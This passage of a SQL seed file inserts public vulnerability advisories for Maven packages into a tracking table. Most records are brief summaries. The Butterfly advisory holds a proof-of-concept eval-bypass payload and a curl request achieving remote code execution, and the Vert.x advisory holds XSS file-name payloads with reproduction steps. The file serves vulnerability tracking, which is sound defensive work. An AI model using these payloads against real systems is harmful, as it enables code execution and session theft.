Users are recommended to upgrade to version 3.1.9, which fixes the issue.', '["3.0.0", "3.0.0-alpha", "3.0.0-beta-1", "3.0.0-beta-2", "3.0.1", "3.0.2", "3.0.3", "3.0.4", "3.0.5", "3.0.6", "3.1.0", "3.1.1", "3.1.2", "3.1.3", "3.1.4", "3.1.5", "3.1.6", "3.1.7", "3.1.8"]'::jsonb, '0.0', '2023-12-30 18:30:37+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-r5fj-j449-vqw2', 'OSV', 'com.liferay:com.liferay.fragment.service', 'maven', 'Liferay Portal and Liferay DXP Vulnerable to SQL Injection via the Fragment Module', 'A SQL injection vulnerability in the Fragment module before 4.0.33 from Liferay Portal (7.3.3 through 7.4.3.16), and Liferay DXP 7.3 before update 4, and 7.4 before update 17 allows attackers to execute arbitrary SQL commands via a PortletPreferences'' `namespace` attribute.', '["7.4.10.ep1", "7.4.11", "7.4.12", "7.4.13", "7.4.13.u1", "7.4.13.u10", "7.4.13.u15", "7.4.13.u16", "7.4.13.u2", "7.4.13.u3", "7.4.13.u4", "7.4.13.u5", "7.4.13.u6", "7.4.13.u7", "7.4.13.u8", "7.4.13.u9"]'::jsonb, '0.0', '2022-11-15 12:00:16+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jmw7-ph6p-33cc', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Exposure of Sensitive Information in Jenkins Core', 'Jenkins before 1.650 and LTS before 1.642.2 do not use a constant-time algorithm to verify CSRF tokens, which makes it easier for remote attackers to bypass a CSRF protection mechanism via a brute-force approach.', '["1.396", "1.397", "1.398", "1.399", "1.400", "1.401", "1.403", "1.404", "1.405", "1.406", "1.407", "1.408", "1.409", "1.409.1", "1.409.2", "1.409.3", "1.410", "1.411", "1.412", "1.413", "1.414", "1.415", "1.416", "1.417", "1.418", "1.419", "1.420", "1.421", "1.422", "1.423", "1.424", "1.424.1", "1.424.2", "1.424.3", "1.424.4", "1.424.5", "1.424.6", "1.425", "1.426", "1.427", "1.428", "1.429", "1.430", "1.431", "1.432", "1.433", "1.434", "1.435", "1.436", "1.437", "1.438", "1.439", "1.440", "1.441", "1.442", "1.443", "1.444", "1.445", "1.446", "1.447", "1.447.1", "1.447.2", "1.448", "1.449", "1.450", "1.451", "1.452", "1.453", "1.454", "1.455", "1.456", "1.457", "1.458", "1.459", "1.460", "1.461", "1.462", "1.463", "1.464", "1.465", "1.466", "1.466.1", "1.466.2", "1.467", "1.468", "1.469", "1.470", "1.471", "1.472", "1.473", "1.474", "1.475", "1.476", "1.477", "1.478", "1.479", "1.480", "1.480.1", "1.480.2", "1.480.3", "1.481", "1.482", "1.483", "1.484", "1.485", "1.486", "1.487", "1.488", "1.489", "1.490", "1.491", "1.492", "1.493", "1.494", "1.495", "1.496", "1.497", "1.498", "1.499", "1.500", "1.501", "1.502", "1.503", "1.504", "1.505", "1.506", "1.507", "1.508", "1.509", "1.509.1", "1.509.2", "1.509.2.JENKINS-14362-jzlib", "1.509.2.JENKINS-8856-diag", "1.509.3", "1.509.3.JENKINS-14362-jzlib", "1.509.4", "1.510", "1.511", "1.512", "1.513", "1.514", "1.515", "1.516", "1.516.JENKINS-14362-jzlib", "1.517", "1.518", "1.518.JENKINS-14362-jzlib", "1.519", "1.520", "1.521", "1.522", "1.523", "1.524", "1.525", "1.526", "1.527", "1.528", "1.529", "1.530", "1.531", "1.532", "1.532.1", "1.532.1.JENKINS-19453", "1.532.2", "1.532.2.JENKINS-21622-diag", "1.532.2.JENKINS-22395-diag", "1.532.3", "1.532.3.JENKINS-22395", "1.532.3.JENKINS-22395-2", "1.533", "1.534", "1.535", "1.536", "1.537", "1.538", "1.539", "1.540", "1.541", "1.542", "1.543", "1.544", "1.545", "1.546", "1.547", "1.548", "1.549", "1.550", "1.551", "1.552", "1.553", "1.554", "1.554.1", "1.554.2", "1.554.3", "1.554.3.JENKINS-18065-ALLRM-all", "1.554.3.JENKINS-18065-JENKINS-23945", "1.555", "1.556", "1.557", "1.558", "1.559", "1.560", "1.561", "1.562", "1.563", "1.564", "1.565", "1.565.1", "1.565.1.JENKINS-22395-dropLinks", "1.565.2", "1.565.3", "1.566", "1.567", "1.568", "1.569", "1.570", "1.571", "1.572", "1.573", "1.574", "1.575", "1.576", "1.577", "1.578", "1.579", "1.580", "1.580.1", "1.580.2", "1.580.3", "1.581", "1.582", "1.583", "1.584", "1.585", "1.586", "1.587", "1.588", "1.589", "1.590", "1.591", "1.592", "1.593", "1.594", "1.595", "1.596", "1.596.1", "1.596.2", "1.596.3", "1.597", "1.598", "1.599", "1.600", "1.601", "1.602", "1.604", "1.605", "1.606", "1.607", "1.608", "1.609", "1.609.1", "1.609.2", "1.609.3", "1.610", "1.611", "1.612", "1.613", "1.614", "1.615", "1.616", "1.617", "1.618", "1.619", "1.620", "1.621", "1.622", "1.623", "1.624", "1.625", "1.625.1", "1.625.2", "1.625.3", "1.626", "1.627", "1.628", "1.629", "1.630", "1.631", "1.632", "1.633", "1.634", "1.635", "1.636", "1.637", "1.638", "1.639", "1.640", "1.641", "1.642", "1.642.1", "1.642.2", "1.642.3", "1.642.4", "1.643", "1.644", "1.645", "1.646", "1.647", "1.648", "1.649"]'::jsonb, '0.0', '2022-05-14 03:58:15+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-mpcw-3j5p-p99x', 'OSV', 'org.openrefine.dependencies:butterfly', 'maven', 'Butterfly''s parseJSON, getJSON functions eval malicious input, leading to remote code execution (RCE)', E'### Summary

Usage of the `Butterfly.prototype.parseJSON` or `getJSON` functions on an attacker-controlled crafted input string allows the attacker to execute arbitrary JavaScript code on the server.

Since Butterfly JavaScript code has access to Java classes, it can run arbitrary programs.

### Details

The `parseJSON` function (edu/mit/simile/butterfly/Butterfly.js:64) works by calling `eval`, an approach that goes back to the original library by Crockford, before JSON was part of the ECMAScript language. It uses a regular expression to remove strings from the input, then checks that there are no unexpected characters in the non-string remainder.

However, the regex is imperfect, as was [discovered earlier by Mike Samuel](https://dev.to/mikesamuel/2008-silently-securing-jsonparse-5cbb); specifically, the "cleaner" can be tricked into treating part of the input as a string that the "evaluator" does not, because of a difference in interpretation regarding the [the Unicode zero-width joiner character](https://unicode-explorer.com/c/200D). Representing that character with a visible symbol, a malicious input looks like:

```js
"\\�\\", Packages.java.lang.Runtime.getRuntime().exec(''gnome-calculator'')) // "
```

This is understood...

* by `JSON_cleaning_RE` as a single string, and because it is a string it can be collapsed to nothing, which is not problematic, so the original input proceeds to `eval`.
* by the `eval` function, which ignores zero-width joiners entirely, as a string containing a single escaped backslash, followed by a comma, then a function call, closing parenthesis, and finally a line comment.
 
The function call is evaluated, and a calculator is opened.

Possible mitigations and additional defenses could include:

* Replacing the JSON implementation with Rhino''s built-in implementation.
* Dropping all JSON-related and JSONP-related code entirely.
* Restricting the access the JavaScript controller code has to the rest of the system by using `initSafeStandardObjects` instead of `initStandardObjects`, using `setClassShutter`, and so on.

### PoC

Change OpenRefine `core` `controller.js` to add a call to the vulnerable `getJSON` function:

```diff
diff --git a/main/webapp/modules/core/MOD-INF/controller.js b/main/webapp/modules/core/MOD-INF/controller.js
index 4ceba0676..1ce0936d2 100644
--- a/main/webapp/modules/core/MOD-INF/controller.js
+++ b/main/webapp/modules/core/MOD-INF/controller.js
@@ -631,0 +632,5 @@ function process(path, request, response) {
+    if (path == "getjsontest") {
+      butterfly.getJSON(request);
+      return true;
+    }
+
```

Then, restart OpenRefine and submit the malicious request. For example, the following `bash` command (with $'' quoting) should do it:

```
curl -H ''Content-Type: application/json;charset=utf-8'' --data $''"\\\\\\u200d\\\\", Packages.java.lang.Runtime.getRuntime().exec(\\''gnome-calculator\\'')) // "'' http://localhost:3333/getjsontest
```

### Impact

Any JavaScript controller that calls one of these functions is vulnerable to remote code execution.

OpenRefine itself seems unaffected; both OpenRefine and jQuery have their own functions also called parseJSON and getJSON, but those are unrelated.', '["1.0.2", "1.0.3", "1.0.4", "1.1.0", "1.1.1", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.4", "1.2.5"]'::jsonb, '0.0', '2024-10-24 18:27:50+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-q2xx-f8r3-9mg5', 'OSV', 'io.strimzi:strimzi', 'maven', 'STRIMZI incorrect access control', 'Incorrect access control in the Kafka Connect REST API in the STRIMZI Project 0.41.0 and earlier allows an attacker to deny the service for Kafka Mirroring, potentially mirror the topics'' content to his Kafka cluster via a malicious connector (bypassing Kafka ACL if it exists), and potentially steal Kafka SASL credentials, by querying the MirrorMaker Kafka REST API.', '["0.10.0", "0.11.0", "0.11.1", "0.11.2", "0.11.3", "0.11.4", "0.12.0", "0.12.1", "0.12.2", "0.13.0", "0.14.0", "0.15.0", "0.16.0", "0.16.1", "0.16.2", "0.17.0", "0.18.0", "0.19.0", "0.20.0", "0.20.1", "0.21.0", "0.21.1", "0.22.0", "0.22.1", "0.23.0", "0.24.0", "0.25.0", "0.26.0", "0.26.1", "0.27.0", "0.27.1", "0.28.0", "0.29.0", "0.30.0", "0.31.0", "0.31.1", "0.32.0", "0.33.0", "0.33.1", "0.33.2", "0.34.0", "0.35.0", "0.35.1", "0.36.0", "0.36.1", "0.37.0", "0.38.0", "0.39.0", "0.40.0", "0.41.0", "0.9.0"]'::jsonb, '0.0', '2024-06-17 21:31:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-3269-jqp5-v8c9', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Jenkins allows for Privilege Escalation by Remote Authenticated Users', 'The API token-issuing service in Jenkins before 1.606 and LTS before 1.596.2 allows remote attackers to gain privileges via a "forced API token change" involving anonymous users.', '["1.396", "1.397", "1.398", "1.399", "1.400", "1.401", "1.403", "1.404", "1.405", "1.406", "1.407", "1.408", "1.409", "1.409.1", "1.409.2", "1.409.3", "1.410", "1.411", "1.412", "1.413", "1.414", "1.415", "1.416", "1.417", "1.418", "1.419", "1.420", "1.421", "1.422", "1.423", "1.424", "1.424.1", "1.424.2", "1.424.3", "1.424.4", "1.424.5", "1.424.6", "1.425", "1.426", "1.427", "1.428", "1.429", "1.430", "1.431", "1.432", "1.433", "1.434", "1.435", "1.436", "1.437", "1.438", "1.439", "1.440", "1.441", "1.442", "1.443", "1.444", "1.445", "1.446", "1.447", "1.447.1", "1.447.2", "1.448", "1.449", "1.450", "1.451", "1.452", "1.453", "1.454", "1.455", "1.456", "1.457", "1.458", "1.459", "1.460", "1.461", "1.462", "1.463", "1.464", "1.465", "1.466", "1.466.1", "1.466.2", "1.467", "1.468", "1.469", "1.470", "1.471", "1.472", "1.473", "1.474", "1.475", "1.476", "1.477", "1.478", "1.479", "1.480", "1.480.1", "1.480.2", "1.480.3", "1.481", "1.482", "1.483", "1.484", "1.485", "1.486", "1.487", "1.488", "1.489", "1.490", "1.491", "1.492", "1.493", "1.494", "1.495", "1.496", "1.497", "1.498", "1.499", "1.500", "1.501", "1.502", "1.503", "1.504", "1.505", "1.506", "1.507", "1.508", "1.509", "1.509.1", "1.509.2", "1.509.2.JENKINS-14362-jzlib", "1.509.2.JENKINS-8856-diag", "1.509.3", "1.509.3.JENKINS-14362-jzlib", "1.509.4", "1.510", "1.511", "1.512", "1.513", "1.514", "1.515", "1.516", "1.516.JENKINS-14362-jzlib", "1.517", "1.518", "1.518.JENKINS-14362-jzlib", "1.519", "1.520", "1.521", "1.522", "1.523", "1.524", "1.525", "1.526", "1.527", "1.528", "1.529", "1.530", "1.531", "1.532", "1.532.1", "1.532.1.JENKINS-19453", "1.532.2", "1.532.2.JENKINS-21622-diag", "1.532.2.JENKINS-22395-diag", "1.532.3", "1.532.3.JENKINS-22395", "1.532.3.JENKINS-22395-2", "1.533", "1.534", "1.535", "1.536", "1.537", "1.538", "1.539", "1.540", "1.541", "1.542", "1.543", "1.544", "1.545", "1.546", "1.547", "1.548", "1.549", "1.550", "1.551", "1.552", "1.553", "1.554", "1.554.1", "1.554.2", "1.554.3", "1.554.3.JENKINS-18065-ALLRM-all", "1.554.3.JENKINS-18065-JENKINS-23945", "1.555", "1.556", "1.557", "1.558", "1.559", "1.560", "1.561", "1.562", "1.563", "1.564", "1.565", "1.565.1", "1.565.1.JENKINS-22395-dropLinks", "1.565.2", "1.565.3", "1.566", "1.567", "1.568", "1.569", "1.570", "1.571", "1.572", "1.573", "1.574", "1.575", "1.576", "1.577", "1.578", "1.579", "1.580", "1.580.1", "1.580.2", "1.580.3", "1.581", "1.582", "1.583", "1.584", "1.585", "1.586", "1.587", "1.588", "1.589", "1.590", "1.591", "1.592", "1.593", "1.594", "1.595", "1.596", "1.596.1"]'::jsonb, '0.0', '2022-05-17 03:53:16+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-j26w-f9rq-mr2q', 'OSV', 'org.eclipse.jetty.ee10:jetty-ee10-servlets', 'maven', 'Eclipse Jetty has a denial of service vulnerability on DosFilter', 'Description
There exists a security vulnerability in Jetty''s DosFilter which can be exploited by unauthorized users to cause remote denial-of-service (DoS) attack on the server using DosFilter. By repeatedly sending crafted requests, attackers can trigger OutofMemory errors and exhaust the server''s memory finally.


Vulnerability details
The Jetty DoSFilter (Denial of Service Filter) is a security filter designed to protect web applications against certain types of Denial of Service (DoS) attacks and other abusive behavior. It helps to mitigate excessive resource consumption by limiting the rate at which clients can make requests to the server.  The DoSFilter monitors and tracks client request patterns, including request rates, and can take actions such as blocking or delaying requests from clients that exceed predefined thresholds.  The internal tracking of requests in DoSFilter is the source of this OutOfMemory condition.


Impact
Users of the DoSFilter may be subject to DoS attacks that will ultimately exhaust the memory of the server if they have not configured session passivation or an aggressive session inactivation timeout.


Patches
The DoSFilter has been patched in all active releases to no longer support the session tracking mode, even if configured.


Patched releases:

  *  9.4.54
  *  10.0.18
  *  11.0.18
  *  12.0.3', '["11.0.0", "11.0.1", "11.0.10", "11.0.11", "11.0.12", "11.0.13", "11.0.14", "11.0.15", "11.0.16", "11.0.17", "11.0.2", "11.0.3", "11.0.4", "11.0.5", "11.0.6", "11.0.7", "11.0.8", "11.0.9"]'::jsonb, '0.0', '2024-10-14 15:30:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-hgrr-935x-pq79', 'OSV', 'org.apache.tomcat:tomcat', 'maven', 'Apache Tomcat Vulnerable to Improper Resource Shutdown or Release', 'If an error occurred (including exceeding limits) during the processing of a multipart upload, temporary copies of the uploaded parts written to disc were not cleaned up immediately but left for the garbage collection process to delete. Depending on JVM settings, application memory usage and application load, it was possible that space for the temporary copies of uploaded parts would be filled faster than GC cleared it, leading to a DoS.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.11, from 10.1.0-M1 through 10.1.46, from 9.0.0.M1 through 9.0.109.

The following versions were EOL at the time the CVE was created but are 
known to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.
Users are recommended to upgrade to version 11.0.12 or later, 10.1.47 or later or 9.0.110 or later which fixes the issue.', '["8.5.0", "8.5.100", "8.5.11", "8.5.12", "8.5.13", "8.5.14", "8.5.15", "8.5.16", "8.5.19", "8.5.2", "8.5.20", "8.5.21", "8.5.23", "8.5.24", "8.5.27", "8.5.28", "8.5.29", "8.5.3", "8.5.30", "8.5.31", "8.5.32", "8.5.33", "8.5.34", "8.5.35", "8.5.37", "8.5.38", "8.5.39", "8.5.4", "8.5.40", "8.5.41", "8.5.42", "8.5.43", "8.5.45", "8.5.46", "8.5.47", "8.5.49", "8.5.5", "8.5.50", "8.5.51", "8.5.53", "8.5.54", "8.5.55", "8.5.56", "8.5.57", "8.5.58", "8.5.59", "8.5.6", "8.5.60", "8.5.61", "8.5.63", "8.5.64", "8.5.65", "8.5.66", "8.5.68", "8.5.69", "8.5.70", "8.5.71", "8.5.72", "8.5.73", "8.5.75", "8.5.76", "8.5.77", "8.5.78", "8.5.79", "8.5.8", "8.5.81", "8.5.82", "8.5.83", "8.5.84", "8.5.85", "8.5.86", "8.5.87", "8.5.88", "8.5.89", "8.5.9", "8.5.90", "8.5.91", "8.5.92", "8.5.93", "8.5.94", "8.5.95", "8.5.96", "8.5.97", "8.5.98", "8.5.99"]'::jsonb, '0.0', '2025-10-27 18:31:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-q77q-vx4q-xx6q', 'OSV', 'org.owasp.esapi:esapi', 'maven', 'Cross-site Scripting in org.owasp.esapi:esapi', '### Impact
There is a potential for an XSS vulnerability in ESAPI caused by a incorrect regular expression for "onsiteURL" in the **antisamy-esapi.xml** configuration file that can cause URLs with the "javascript:" scheme to NOT be sanitized. See the reference below for full details.

### Patches
Patched in ESAPI 2.3.0.0 and later. See important remediation details in the reference given below.

### Workarounds
Manually edit your **antisamy-esapi.xml** configuration files to change the "onsiteURL" regular expression as per remediation instructions in the reference below.

### References
[Security Bulletin 8](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin8.pdf)

### For more information
If you have any questions or comments about this advisory:
* Email one of the project co-leaders. See email addresses listed on  the [OWASP ESAPI wiki](https://owasp.org/www-project-enterprise-security-api/) page, under "Leaders".
* Send email to one of the two ESAPI related Google Groups listed under [Where to Find More Information on ESAPI](https://github.com/ESAPI/esapi-java-legacy#where-to-find-more-information-on-esapi) on our [README.md](https://github.com/ESAPI/esapi-java-legacy#readme) page.', '["2.0.1", "2.0GA", "2.0_rc10", "2.0_rc11", "2.0_rc9", "2.1.0", "2.1.0.1", "2.2.0.0", "2.2.0.0-RC2", "2.2.0.0-RC3", "2.2.1.0", "2.2.1.0-RC1", "2.2.1.1", "2.2.2.0", "2.2.3.0", "2.2.3.1"]'::jsonb, '0.0', '2022-04-27 21:09:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-ppxx-m926-g569', 'OSV', 'org.apache.kylin:kylin-core-common', 'maven', 'Apache Kylin vulnerable to remote code execution', 'Kylin''s cube designer function has a command injection vulnerability when overwriting system parameters in the configuration overwrites menu. RCE can be implemented by closing the single quotation marks around the parameter value of “-- conf=” to inject any operating system command into the command line parameters. This vulnerability affects Kylin 2 version 2.6.5 and earlier, Kylin 3 version 3.1.2 and earlier, and Kylin 4 version 4.0.1 and earlier.', '["1.5.3", "1.5.4", "1.5.4.1", "1.6.0", "2.0.0", "2.1.0", "2.2.0", "2.3.0", "2.3.1", "2.3.2", "2.4.0", "2.4.1", "2.5.0", "2.5.1", "2.5.2", "2.6.0", "2.6.1", "2.6.2", "2.6.3", "2.6.4", "2.6.5", "2.6.6", "3.0.0", "3.0.0-alpha", "3.0.0-alpha2", "3.0.1", "3.0.2", "3.1.0", "3.1.1", "3.1.2", "3.1.3", "4.0.0", "4.0.0-alpha", "4.0.0-beta", "4.0.1"]'::jsonb, '0.0', '2023-07-06 19:24:01+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-45p5-v273-3qqr', 'OSV', 'io.vertx:vertx-web', 'maven', 'Vert.x-Web vulnerable to Stored Cross-site Scripting in directory listings via file names', '# Description

- In the `StaticHandlerImpl#sendDirectoryListing(...)` method under the `text/html` branch, file and directory names are directly embedded into the `href`, `title`, and link text without proper HTML escaping.
- As a result, in environments where an attacker can control file names, injecting HTML/JavaScript is possible. Simply accessing the directory listing page will trigger an XSS.
- Affected Code:
    - File: `vertx-web/src/main/java/io/vertx/ext/web/handler/impl/StaticHandlerImpl.java`
    - Lines:
        - 709–713: `normalizedDir` is constructed without escaping
        - 714–731: `<li><a ...>` elements insert file names directly into attributes and body without escaping
        - 744: parent directory name construction
        - 746–751: `{directory}`, `{parent}`, and `{files}` are inserted into the HTML template without escaping

# Reproduction Steps

1. Prerequisites:
    - Directory listing is enabled using `StaticHandler`  
      (e.g., `StaticHandler.create("public").setDirectoryListing(true)`)
    - The attacker has the ability to create arbitrary file names under a public directory (e.g., via upload functionality or a shared directory)

2. Create a malicious file name (example for Unix-based OS):
    - Create an empty file in `public/` with one of the following names:
      - `<img src=x onerror=alert(''XSS'')>.txt`
      - Or attribute injection: `evil" onmouseover="alert(''XSS'')".txt`
    - Example:
      ```bash
      mkdir -p public
      printf ''test'' > "public/<img src=x onerror=alert(''XSS'')>.txt"
      ```

3. Start the server (example):
    - Routing: `router.route("/public/*").handler(StaticHandler.create("public").setDirectoryListing(true));`
    - Server: `vertx.createHttpServer().requestHandler(router).listen(8890);`

4. Verification request (raw HTTP):
    ```
    GET /public/ HTTP/1.1
    Host: 127.0.0.1:8890
    Accept: text/html
    Connection: close
    ```

5. Example response excerpt:
    ```html
    <ul id="files">
      <li>
        <a href="/public/<img src=x onerror=alert(''XSS'')>.txt"
           title="<img src=x onerror=alert(''XSS'')>.txt">
           <img src=x onerror=alert(''XSS'')>.txt
        </a>
      </li>
      ...
    </ul>
    ```

- When accessing `/public/` in a browser, the unescaped file name is interpreted as HTML, and event handlers such as `onerror` are executed.

# Potential Impact

- **Stored XSS**
    - Arbitrary JavaScript executes in the browser context of users viewing the listing page
    - Possible consequences:
        - Theft of session tokens, JWTs, localStorage contents, or CSRF tokens
        - Unauthorized actions with admin privileges (user creation, permission changes, settings modifications)
        - Watering hole attacks, including malware distribution or malicious script injection to other pages

- **Common Conditions That Make Exploitation Easier**
    - Uploaded files are served directly under a publicly accessible directory
    - Shared/synced directories (e.g., NFS, SMB, WebDAV, or cloud sync) are exposed
    - ZIP/TAR archives are extracted directly under the webroot and directory listing is enabled in production environments

# Similar CVEs Previously Reported

- CVE‑2024‑32966  
- CVE‑2019‑15603', '["5.0.0", "5.0.1", "5.0.2", "5.0.3", "5.0.4"]'::jsonb, '0.0', '2025-10-22 19:38:11+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2mx7-xvfg-fg53', 'OSV', 'com.liferay.portal:release.portal.bom', 'maven', 'Liferay Portal''s account lockout does not invalidate existing user sessions', 'Account lockout in Liferay Portal 7.2.0 through 7.3.0, and older unsupported versions, and Liferay DXP 7.2 before fix pack 5, and older unsupported versions does not invalidate existing user sessions, which allows remote authenticated users to remain authenticated after an account has been locked.', '["7.2.1", "7.2.10", "7.2.10.fp1", "7.2.10.fp1-1", "7.2.10.fp2", "7.2.10.fp3", "7.2.10.fp4"]'::jsonb, '0.0', '2024-02-08 03:32:45+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x832-fpvj-r5ph', 'OSV', 'org.mustangproject:library', 'maven', 'Mustangproject allows exfiltrating files via XXE attacks', 'Mustang before 2.16.3 allows exfiltrating files via XXE attacks.', '["2.0.0", "2.0.0-alpha3", "2.0.1", "2.0.2", "2.0.3", "2.1.0", "2.1.1", "2.10.0", "2.11.0", "2.12.0", "2.13.0", "2.14.0", "2.14.1", "2.14.2", "2.15.0", "2.15.1", "2.15.2", "2.16.0", "2.16.1", "2.16.2", "2.2.0", "2.2.1", "2.3.0", "2.3.1", "2.3.2", "2.3.3", "2.4.0", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.5.4", "2.5.5", "2.5.6", "2.5.7", "2.6.0", "2.6.1", "2.6.2", "2.7.0", "2.7.1", "2.7.2", "2.7.3", "2.8.0", "2.9.0"]'::jsonb, '0.0', '2025-11-28 06:32:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-h4qg-p7r2-cpg3', 'OSV', 'org.apache.xmlgraphics:batik', 'maven', 'Apache Batik vulnerable to Server-Side Request Forgery', 'Server-Side Request Forgery (SSRF) vulnerability in Batik of Apache XML Graphics allows an attacker to access files using a Jar url. This issue affects Apache XML Graphics Batik 1.14.', '["1.10", "1.11", "1.12", "1.13", "1.14", "1.9.1"]'::jsonb, '0.0', '2022-09-23 00:00:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-pv3g-vc3q-8c9g', 'OSV', 'com.jfinal:jfinal', 'maven', 'Cross-Site Request Forgery in JFinalCMS via admin/nav/delete', 'JFinalCMS v5.0.0 was discovered to contain a Cross-Site Request Forgery (CSRF) vulnerability via admin/nav/delete.', '["1.4", "1.4.0", "1.5", "1.6", "1.8", "1.9", "2.0", "2.1", "2.2", "3.0", "3.1", "3.2", "3.3", "3.4", "3.5", "3.6", "3.7", "3.8", "4.0", "4.1", "4.2", "4.3", "4.4", "4.5", "4.6", "4.7", "4.8", "4.9", "4.9.01", "4.9.02", "4.9.03", "4.9.04", "4.9.05", "4.9.06", "4.9.07", "4.9.08", "4.9.09", "4.9.10", "4.9.11", "4.9.12", "4.9.13", "4.9.14", "4.9.15", "4.9.16", "4.9.17", "4.9.18", "4.9.19", "4.9.20", "4.9.21", "4.9.22", "4.9.23", "5.0.0"]'::jsonb, '0.0', '2023-12-05 15:30:38+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-g6rx-2w84-xmgj', 'OSV', 'io.jenkins.plugins:frugal-testing', 'maven', 'CSRF vulnerability in Jenkins Frugal Testing Plugin', 'A cross-site request forgery (CSRF) vulnerability in Jenkins Frugal Testing Plugin 1.1 and earlier allows attackers to connect to Frugal Testing using attacker-specified credentials, and to retrieve test IDs and names from Frugal Testing, if a valid credential corresponds to the attacker-specified username.', '["1.0", "1.1"]'::jsonb, '0.0', '2023-09-06 15:30:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-rhqj-4pp8-vvgf', 'OSV', 'org.jolokia:jolokia-core', 'maven', 'Injection in Jolokia agent', 'A JNDI Injection vulnerability exists in Jolokia agent version 1.3.7 in the proxy mode that allows a remote attacker to run arbitrary Java code on the server.', '["1.3.7", "1.4.0"]'::jsonb, '0.0', '2022-05-14 01:27:09+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-vh98-fqfc-4hj3', 'OSV', 'org.apache.geode:geode-core', 'maven', 'Apache Geode vulnerable to Exposure of Sensitive Information', 'When an Apache Geode cluster before v1.2.1 is operating in secure mode, an unauthenticated client can enter multi-user authentication mode and send metadata messages. These metadata operations could leak information about application data types. In addition, an attacker could perform a denial of service attack on the cluster.', '["1.0.0-incubating", "1.0.0-incubating.M2", "1.0.0-incubating.M3", "1.1.0", "1.1.1", "1.2.0"]'::jsonb, '0.0', '2022-05-13 01:48:08+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-q2wv-m3pq-xpv9', 'OSV', 'org.jenkins-ci.plugins:skytap', 'maven', 'Credentials transmitted in plain text by Skytap Cloud CI Plugin', 'Skytap Cloud CI Plugin stores credentials in job `config.xml` files as part of its configuration.

While the credentials are stored encrypted on disk, they are transmitted in plain text as part of the configuration form by Skytap Cloud CI Plugin 2.07 and earlier. These credentials could be viewed by users with Extended Read permission.', '["1.01", "1.02", "1.03", "2.00", "2.01", "2.02", "2.03", "2.04", "2.05", "2.06", "2.07"]'::jsonb, '0.0', '2022-05-24 17:10:30+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-5hvr-3fcr-wx8c', 'OSV', 'io.alauda.jenkins.plugins:alauda-kubernetes-support', 'maven', 'Cross-Site Request Forgery in Jenkins Alauda Kubernetes Suport Plugin', 'A cross-site request forgery vulnerability in Jenkins Alauda Kubernetes Suport Plugin 2.3.0 and earlier allows attackers to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing the Kubernetes service account token or credentials stored in Jenkins.', '["2.0.0", "2.0.1", "2.1.0-alpha", "2.1.1", "2.1.2", "2.2.0", "2.3.0"]'::jsonb, '0.0', '2022-05-24 17:03:49+00') ON CONFLICT (id) DO NOTHING;
